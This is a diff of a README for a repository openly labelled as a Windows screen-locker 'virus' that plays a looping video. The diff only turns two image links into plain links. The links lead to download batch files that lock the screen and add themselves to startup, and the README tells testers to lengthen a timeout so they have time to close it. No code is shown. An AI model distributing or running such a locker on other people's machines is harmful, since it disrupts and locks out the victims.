@@ -9,11 +9,11 @@
 ### Wanna test?
 <p>Ok, if want to test u must download the</p>
 
-![dsddy.bat](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/ManiFast/WinLock_with_playloop_video--Virus--/blob/main/dsddsy.bat)
+[dsddy.bat](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/ManiFast/WinLock_with_playloop_video--Virus--/blob/main/dsddsy.bat)
 
 <p>Then go to edit file and at the end find latest timeout, and set it to 10 or higher (during this time you will have time to close), ! If u want delete from startup download the</p>
 
-![tablet.bat](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/ManiFast/WinLock_with_playloop_video--Virus--/blob/main/tablet.bat)
+[tablet.bat](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/ManiFast/WinLock_with_playloop_video--Virus--/blob/main/tablet.bat)
 
 </h4>Features:</h4></br>
 
